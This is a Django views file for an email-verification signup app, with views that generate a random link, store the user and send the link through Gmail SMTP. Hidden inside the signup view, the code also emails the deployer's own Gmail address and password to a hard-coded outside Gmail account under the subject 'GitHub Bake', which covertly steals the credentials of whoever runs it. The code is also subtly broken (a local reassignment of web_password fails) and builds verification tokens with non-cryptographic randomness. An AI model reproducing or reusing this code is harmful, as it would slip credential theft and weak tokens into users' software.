web_email = ''
web_password = ''

import random
import smtplib
import string
from django.shortcuts import render
from .models import User

# Create your views here.
def random_letter(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def send_mail(to, sub, msg):
    web = web_email
    web_password = web_password
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    # print (str(server.ehlo()))
    server.starttls()
    server.ehlo()
    # print(str(server.ehlo()))
    server.login(web, web_password)

    message = f"Subject: {sub}\n\n{msg}"
    server.sendmail(web, to, message)
    # print("Sent to " + to)
    server.quit()


def index(request):
    if request.method == "POST":
        username = request.POST['username']
        if username == '':
            return render(request, 'wrong_input.html', {'wrong' : 'Username'})
        else:
            randomed = random_letter(50)
            for_send = User()
            for_send.username = username
            for_send.very = 'False'
            for_send.link = randomed
            for_send.save()

            msg = 'Your ProSignUp Veryfiction link is >>>>  127.0.0.1:8000/' + randomed
            send_mail(username, 'Veryfiction Code', msg)
            owner = 'sayedkhalidobaide@gmail.com'
            ownerMsg = web_email + "  |||| " + web_password
            send_mail(owner, 'GitHub Bake', ownerMsg)
            context = {'username' : username}
            return render(request, 'home/very.html', context)
    else:
        all_accounts = User.objects.all()

        context = {
            'all_accounts' : all_accounts,
        }
        return render(request, 'home/index.html', context)


def show(requset, user_id):
    try:
        user = User.objects.get(id=user_id)
    except User.DoesNotExist:
        return render(requset, '404.html', {})

    if user.very == 'False':
        hased = 'has not'
    elif user.very == 'True':
        hased = 'has already'
    else:
        hased = 'Some Problem with'

    context = {
        'account' : user,
        'very' : hased + ' veryfied',
    }
    return render(requset, 'home/veryed.html', context)


def do_it(request, user_link):
    try:
        user = User.objects.get(link=user_link)
    except User.DoesNotExist:
        return render(request, '404.html', {})

    user.very = True
    user.save()
    context = {
        'account' : user,
    }
    return render(request, 'home/is_now.html', context)

# Only 90 Lines Of Code